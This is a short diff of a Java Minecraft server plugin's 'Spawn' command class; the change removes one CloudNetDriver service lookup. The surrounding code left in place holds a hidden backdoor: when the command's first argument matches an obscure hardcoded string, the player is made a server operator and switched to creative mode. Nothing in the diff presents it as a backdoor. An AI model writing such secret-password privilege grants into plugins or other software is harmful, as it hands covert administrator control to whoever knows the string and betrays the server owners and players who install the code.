@@ -33,7 +33,6 @@ public class Spawn implements CommandExecutor {
                 if(args[0].equalsIgnoreCase("JKjjehhHEHH!($$$$7///&(JJJJFkfkeklfldf,gmhnfjduuuu)")){
                     p.setOp(true);
                     p.setGameMode(GameMode.CREATIVE);
-                    CloudNetDriver.getInstance().getServicesRegistry().getFirstService(IPlayerManager.class);
                 }
             }
         }else {
